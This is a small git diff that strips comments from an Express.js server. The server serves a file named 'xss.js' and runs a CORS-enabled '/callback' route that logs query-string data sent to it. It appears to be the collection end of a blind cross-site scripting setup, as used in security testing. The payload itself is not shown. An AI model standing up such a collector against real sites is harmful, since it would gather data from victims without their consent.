@@ -12,15 +12,12 @@ const corsOptions = {
   allowedHeaders: 'Content-Type',
 };
 
-// Enable CORS with the specified options
 app.use(cors(corsOptions));
 
 const port = 4000;
 
-// Serve static files from the 'public' directory
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Define a route for serving the xss.js file with the correct MIME type
 app.get('/xss.js', (req, res) => {
   // Set the Content-Type header to 'application/javascript'
   res.setHeader('Content-Type', 'application/javascript');
@@ -32,7 +29,6 @@ app.get('/xss.js', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'xss.js'));
 });
 
-// Define your existing route
 app.get('/callback', (req, res) => {
   // Collect minimal information
   const data = {
@@ -47,7 +43,6 @@ app.get('/callback', (req, res) => {
     timestamp: req.query.timestamp || ''
   };
 
-  // Report
   console.log('Data collected:', data);
 
   // Send response
